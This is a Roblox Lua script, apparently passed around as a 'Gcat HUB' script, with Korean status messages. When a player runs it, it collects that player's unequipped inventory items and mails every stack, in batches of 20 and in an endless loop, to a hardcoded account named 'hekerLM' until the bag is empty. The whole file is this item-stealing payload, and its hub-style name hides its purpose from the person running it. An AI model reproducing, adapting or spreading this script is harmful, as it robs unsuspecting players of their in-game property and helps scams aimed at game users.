local Players = game:GetService("Players"); local ReplicatedStorage = game:GetService("ReplicatedStorage"); local LocalPlayer = Players.LocalPlayer; local Networking = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Networking")); local PlayerStateClient = require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("PlayerStateClient"));local TARGET_USER = "hekerLM";local MAIL_NOTE = "Gcat HUB 종합 무한 연사 전송"; local function getInventory() local replica = PlayerStateClient:GetLocalReplica(); return replica and replica.Data and replica.Data.Inventory end; local function buildUltimateBatch(inv) local out = {}; local max_slots = 20; for cat, bucket in pairs(inv) do if type(bucket) == "table" then for k, v in pairs(bucket) do if #out >= max_slots then break end; if type(v) == "table" then if not v.Equipped then local count = v.Count or 1; if type(count) == "number" and count > 0 then local remaining = count; while remaining > 0 and #out < max_slots do local sendAmt = math.min(remaining, 9999); out[#out + 1] = { Category = cat, ItemKey = k, Count = sendAmt }; remaining = remaining - sendAmt end end end elseif type(v) == "number" and v > 0 then local remaining = v; while remaining > 0 and #out < max_slots do local sendAmt = math.min(remaining, 9999); out[#out + 1] = { Category = cat, ItemKey = k, Count = sendAmt }; remaining = remaining - sendAmt end end end end if #out >= max_slots then break end end; return out end; local function sendAllInventoryLoop() print("🔄 [Gcat HUB]: 가방 무한 자동 연사 매크로를 가동합니다."); while true do local inv = getInventory(); if not inv then print("❌ 인벤토리 로드 실패"); break end; local batch = buildUltimateBatch(inv); if #batch == 0 then print("✨ [완료]: 가방의 모든 아이템을 완벽하게 전송 완료했습니다!"); break end; print("🚀 [연사 중]: 20개 슬롯 패킷 조립 완료. 발송을 시도합니다..."); local ok, uid = pcall(function() return Networking.Mailbox.LookupPlayer:Fire(TARGET_USER) end); if not ok or type(uid) ~= "number" or uid <= 0 then print("❌ 플레이어 조회 실패로 인해 매크로를 중단합니다."); break end; local success, msg; ok, success, msg = pcall(function() return Networking.Mailbox.SendBatch:Fire(uid, batch, MAIL_NOTE) end); if success == true then print("✅ 20개 묶음 전송 성공 -> 다음 묶음 준비 중..."); task.wait(1.2) else print("❌ 전송 실패: " .. tostring(msg or success) .. " -> 2초 후 재시도..."); task.wait(2.0) end end end; task.spawn(function() for i = 1, 20 do if getInventory() then break end; task.wait(0.5) end; sendAllInventoryLoop() end);
